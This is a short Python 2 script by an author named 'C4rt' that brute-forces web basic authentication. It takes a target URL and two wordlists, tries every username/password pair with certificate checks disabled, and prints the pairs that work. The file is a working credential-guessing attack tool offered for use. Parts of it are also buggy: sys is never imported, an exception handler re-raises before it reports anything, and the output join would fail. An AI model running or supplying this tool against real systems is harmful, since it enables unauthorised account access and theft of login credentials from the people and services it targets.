#!/usr/bin/env python
# -*- coding: utf-8 -*

'''
Small python script to brute force web basic authentication
...
'''

__author__ = "C4rt"
__date__ = "18/07/2013"
__version__ = "1.0"
__maintainer__ = "C4rt"
__email__ = "eric.c4rtman@gmail.com"
__status__ = "Production"

try:
    import requests
    import optparse
    import traceback
except ImportError, err:
    raise
    print >>sys.stderr, "[X] Unable to import : %s\n" % err
    sys.exit(1)


def enumattempt(url, user, pwd):
    urlname = url
    username = user
    password = pwd
    try:
        resp = requests.get(url, auth=(username, password), verify=False)
        if resp.status_code == 200:
            print '[+] Success: {0} : {1}'.format(username, password)
            return (username, password)
        else:
            print '[-] Failure: {0}/{1}'.format(username, password)
            return
    except:
        print "\n\n\n\n", traceback.format_exc()

def main():
    parser = optparse.OptionParser(
        "Usage: bruteAuthWeb.py -H <url> -u <user names file> -d <Password names file>")
    parser.add_option('-H', dest='tgtUrl', type='string',
                          help='specify target Url')
    parser.add_option('-u', dest='userfile', type='string',
                          help='specify dictionnary with login usernames')
    parser.add_option('-d', dest='passfile', type='string',
                          help='specify dictionnary with passwords')
    (options, args) = parser.parse_args()

    url = options.tgtUrl
    userfile = options.userfile
    passfile = options.passfile

    if url == None or userfile == None or passfile == None:
        print parser.usage
        exit(0)
    #
    validcreds = []
    usernames = open(userfile).read().splitlines()
    passnames = open(passfile).read().splitlines()
    print "\nStarting enumeration\n======================"
    for user in usernames:
        for pwd in passnames:
            validcreds.append(enumattempt(url, user, pwd))

    validcreds = [i for i in validcreds if i is not None]
    print "\n\nThe following credentials pairs were valid:\n"
    print "\n".join(validcreds)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print "\n\n[%] Process interrupted by user..", "r", "error"
    except:
        print "\n\n\n\n", traceback.format_exc()
